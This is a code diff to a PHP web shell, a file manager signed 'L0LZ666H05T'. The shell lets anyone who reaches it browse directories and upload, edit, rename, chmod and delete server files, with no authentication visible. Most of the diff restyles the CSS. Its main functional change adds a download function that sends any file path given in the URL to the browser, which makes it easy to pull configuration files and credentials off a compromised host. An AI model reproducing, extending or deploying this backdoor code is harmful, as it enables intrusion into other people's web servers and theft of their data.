@@ -25,7 +25,7 @@ table {
   width: 60%;
   margin: 50px auto;
   border-radius: .25rem;
-  box-shadow: 2px 8px 34px 1px grey;
+  box-shadow: 0px 0px 0px 6px rgba(222,222,222,0.73);
 }
 
 thead tr:first-child {
@@ -65,8 +65,8 @@ td:last-child {
 }
 textarea {
   font-family: 'Ubuntu Mono', monospace;
-  background:#dedede;
-  border:1px solid #dedede;
+  background:rgba(222,222,222,0.73);
+  border:1px solid rgba(222,222,222,0.73);
   margin-left:-8px;
   margin-right:10px;
   margin-top:10px;
@@ -84,7 +84,7 @@ textarea {
 }
 textarea::-webkit-scrollbar {
     width: 12px;
-    background:#dedede;
+    background:rgba(222,222,222,0.73);
 }
 input[type=submit] {
   font-family: 'Ubuntu Mono', monospace;
@@ -97,8 +97,8 @@ input[type=submit] {
   color:#8a8a8a;
   font-weight: bold;
   border-radius:3px;
-  border:1px solid #dedede;
-  background:#dedede;
+  border:1px solid rgba(222,222,222,0.73);
+  background:rgba(222,222,222,0.73);
 }
 input[type=text] {
   font-family: 'Ubuntu Mono', monospace;
@@ -110,8 +110,8 @@ input[type=text] {
   margin-bottom:10px;
   color:#8a8a8a;
   border-radius:3px;
-  border:1px solid #dedede;
-  background:#dedede;
+  border:1px solid rgba(222,222,222,0.73);
+  background:rgba(222,222,222,0.73);
 }
 select {
   font-family: 'Ubuntu Mono', monospace;
@@ -123,12 +123,17 @@ select {
   outline:none;
   color:#8a8a8a;
   border-radius:3px;
-  border:1px solid #dedede;
-  background:#dedede;
+  border:1px solid rgba(222,222,222,0.73);
+  background:rgba(222,222,222,0.73);
 }
 a {
   color: #8a8a8a;
   text-decoration:none;
+}
+a:hover {
+  text-decoration: underline;
+  -webkit-text-decoration-color: red;
+  text-decoration-color: red;
 }
 .alert {
   width: 100%;
@@ -151,9 +156,6 @@ a {
 input:focus,
 textarea:focus,
 select:focus,
-a.back {
-  border:1px solid red;
-}
 th.line {
   border:1px solid #dedede;
 }
@@ -161,8 +163,9 @@ th.line {
   width:25px;
   height:25px;
   margin-bottom:-6px;
+  margin-left:-8px;
 }
-a.back,
+a.back:hover,
 select:hover, 
 input[type=submit]:hover {
     cursor:pointer;
@@ -178,115 +181,21 @@ tr.back {
 }
 a.back {
   font-family: 'Ubuntu Mono', monospace;
-  color:#fff;
+  color:#8a8a8a;
   border-radius:3px;
-  border:1px solid #dedede;
-  background:#dedede;
+  border:1px solid rgba(222,222,222,0.73);
+  background:rgba(222,222,222,0.73);
   padding:5px 30px;
   outline:none;
   width:100%;
-}
-.dropbtn {
-  font-family: 'Ubuntu Mono', monospace;
-  padding:5px;
-  outline:none;
-  
-  width:100%;
-  margin-bottom:10px;
-  color:#000;
-  border-radius:3px;
-  border:1px solid #dedede;
-  background:#dedede;
-  cursor: pointer;
-}
-
-.dropbtn:hover, .dropbtn:focus {
-  border:1px solid red;
-}
-
-.dropdown {
-  width:100%;
-  position: relative;
-  display: inline-block;
-}
-
-.dropdown-content {
-  display: none;
-  position: absolute;
-  background-color: #dedede;
-  min-width: 160px;
-  border-radius:3px;
-  overflow: auto;
-  box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
-  z-index: 1;
-}
-
-.dropdown-content a {
-  color: #000;
-  text-align:left;
-  padding: 1px 16px;
-  text-decoration: none;
-  display: block;
-}
-
-.dropdown a:hover {background-color: #212121;}
-
-.show {display: block;}
-.modal {
-  display: none; /* Hidden by default */
-  position: fixed; /* Stay in place */
-  z-index: 1; /* Sit on top */
-  padding-top: 200px; /* Location of the box */
-  left: 0;
-  top: 0;
-  width: 100%; /* Full width */
-  height: 100%; /* Full height */
-  overflow: auto; /* Enable scroll if needed */
-  background-color: rgb(0,0,0); /* Fallback color */
-  background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
-}
-
-/* Modal Content */
-.modal-content {
-  background-color: transparent;
-  margin: auto;
-  border-radius: 5px;
-  padding: 10px;
-  border: 1px solid transparent;
-  width: 30%;
-}
-
-/* The Close Button */
-.close {
-  color: #aaaaaa;
-  float: right;
-  font-size: 28px;
-  font-weight: bold;
-}
-
-.close:hover,
-.close:focus {
-  color: #000;
-  text-decoration: none;
-  cursor: pointer;
-}
-.bn {
-  font-family: 'Ubuntu Mono', monospace;
-  margin-left:-8px;
-  margin-right:10px;
-  margin-top:10px;
-  margin-bottom:10px;
-  padding:5px;
-  outline:none;
-  color:#fff;
-  border-radius:3px;
-  border:1px solid #dedede;
-  background:#dedede;
 }
 td.act {
   width:28px;
   background:#fff;
   border:1px solid #fff;
+}
+td.img {
+  width:10px;
 }
 </style>
 <body>
@@ -472,6 +381,9 @@ function making($post) {
           <tr>
             <td>
               <?php print @success("Create DIRECTORY ".$_POST['filename']." Successfully") ?>
+              <?php print sleep(7); ?>
+              <?php print flush(); ?>
+              <?php print @header("Location : ?path=".@cwd().DIRECTORY_SEPARATOR.$_POST['filename']."") ?>
             </td>
           </tr>
           <?php
@@ -754,17 +666,34 @@ function delete($filename) {
     }
   }
 }
+function download($post, $filename) {
+  if ($_GET['do'] == $post) {
+    header("Pragma: public");
+    header("Expires: 0");
+    header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
+    header("Content-Type: application/force-download");
+    header("Content-Type: application/octet-stream");
+    header("Content-Type: application/download");
+    header("Content-Disposition: attachment; filename=".basename($filename).";");
+    header("Content-Transfer-Encoding: binary");
+    header("Content-Length: ".filesize($filename));
+  
+    @readfile($filename);
+    exit(0);
+  }
+}
 if ($_GET['do'] == 'delete') 
 {@delete($_GET['file']);}
 @edit("edit", $_GET['file']);
 @renames("rename", $_GET['file']);
 @chmods("chmod", $_GET['file']);
+@download("download", $_GET['file']);
 @upload("upload");
 @making("making");
 ?>
   <thead>
     <tr>
-      <th colspan="4">
+      <th colspan="5">
         <select onclick="if (this.value) window.location=(this.value)" style="width:100%;">
           <option value="" selected>Choose . .</option>
           <option value="?path=<?php print @cwd() ?>&do=upload">Upload File</option>
@@ -773,18 +702,20 @@ if ($_GET['do'] == 'delete')
       </th>
     </tr>
     <tr>
-      <th colspan="4"><?php print @pwd() ?> ( <?php @permission(@cwd(), @perms(@cwd())) ?> )</th>
+      <th colspan="5"><?php print @pwd() ?> ( <?php @permission(@cwd(), @perms(@cwd())) ?> )</th>
     </tr>
   </thead>
   <tbody>
 <?php
 $getPATH = @scandir(@cwd());
 foreach ($getPATH as $dir) {
-  if (!is_dir($dir)) continue;
+  if (!is_dir($dir) || $dir === '.' || $dir === '..') continue;
   ?>
   <tr class="hover">
-    <td> 
+    <td class="img"> 
       <img src="https://image.flaticon.com/icons/svg/716/716784.svg" class="icon">
+    </td>
+    <td>
       <a href="?path=<?php print @cwd().DIRECTORY_SEPARATOR.$dir ?>"><?php print $dir ?></a>
     </td>
     <td>
@@ -797,7 +728,7 @@ foreach ($getPATH as $dir) {
     </td>
     <td>
       <center>
-      <select onclick="if (this.value) window.location=(this.value)">
+      <select style="float:right;" onclick="if (this.value) window.location=(this.value)">
         <option value="" selected>Choose . .</option>
         <option value="?path=<?php print @cwd() ?>&do=rename&file=<?php print @cwd().DIRECTORY_SEPARATOR.$dir ?>">Rename</option>
         <option value="?path=<?php print @cwd() ?>&do=delete&file=<?php print @cwd().DIRECTORY_SEPARATOR.$dir ?>">Delete</option>
@@ -812,9 +743,8 @@ foreach ($getPATH as $file) {
   if (!is_file($file)) continue;
   ?>
   <tr class="hover">
-    <td>
   <?php
-  print("<img src='");
+  print("<td class='img'><img src='");
   $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
   if($ext == "php"){
     echo 'https://image.flaticon.com/icons/png/128/337/337947.png'; 
@@ -865,13 +795,15 @@ foreach ($getPATH as $file) {
     } elseif ($ext == "md"){echo 'https://image.flaticon.com/icons/png/128/617/617520.png';
   } else {
     echo 'https://image.flaticon.com/icons/svg/833/833524.svg';
-  } print("' class='icon'></img>");
+  } print("' class='icon'></img></td>");
   if (strlen($file) > 25){
     $_file = substr($file, 0, 25)."...-.".$ext;                       
   } else {
     $_file = $file;          }
   ?>
+    <td>
       <?php print $file ?>
+    </td>
     </td>
     <td>
       <center>
@@ -885,12 +817,13 @@ foreach ($getPATH as $file) {
     </td>
     <td>
       <center>
-        <select onclick="if (this.value) window.location=(this.value)">
+        <select style="float:right;" onclick="if (this.value) window.location=(this.value)">
         <option value="" selected>Choose . .</option>
         <option value="?path=<?php print @cwd() ?>&do=edit&file=<?php print @cwd().DIRECTORY_SEPARATOR.$file ?>">Edit</option>
         <option value="?path=<?php print @cwd() ?>&do=rename&file=<?php print @cwd().DIRECTORY_SEPARATOR.$file ?>">Rename</option>
         <option value="?path=<?php print @cwd() ?>&do=delete&file=<?php print @cwd().DIRECTORY_SEPARATOR.$file ?>">Delete</option>
         <option value="?path=<?php print @cwd() ?>&do=chmod&file=<?php print  @cwd().DIRECTORY_SEPARATOR.$file ?>">Chmod</option>
+        <option value="?path=<?php print @cwd() ?>&do=download&file=<?php print  @cwd().DIRECTORY_SEPARATOR.$file ?>">Download</option>
       </select>
       </center>
     </center>
@@ -902,7 +835,7 @@ foreach ($getPATH as $file) {
 </tbody>
 <thead>
     <tr>
-        <th colspan="4" style="border:none;">&copy; <?php print @date("Y") ?> - L0LZ666H05T</th>
+        <th colspan="5" style="border:none;">&copy; <?php print @date("Y") ?> - L0LZ666H05T</th>
     </tr>
 </thead>
 </table>
